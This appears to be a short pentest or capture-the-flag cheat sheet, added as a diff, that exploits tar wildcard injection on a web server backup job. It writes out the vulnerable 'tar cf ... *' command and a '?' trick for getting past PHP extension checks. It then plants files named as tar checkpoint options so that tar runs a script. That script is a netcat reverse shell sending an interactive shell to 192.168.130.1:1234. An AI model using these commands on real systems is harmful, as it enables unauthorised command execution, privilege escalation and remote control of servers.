@@ -1,0 +1,19 @@
+Example of vulnerable code
+cd /var/www/html
+tar cf /backup/backup.tgz *
+
+
+#escape extension issue with php,
+add ? after the file example
+http://192.168.1.108/shell.php?
+
+#We gonna use this property of tar to run code 
+#tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+touch "/var/www/html/--checkpoint=1"
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+chmod +x /var/www/html/shell.sh
+
+Content of shell.sh
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.1 1234 >/tmp/f
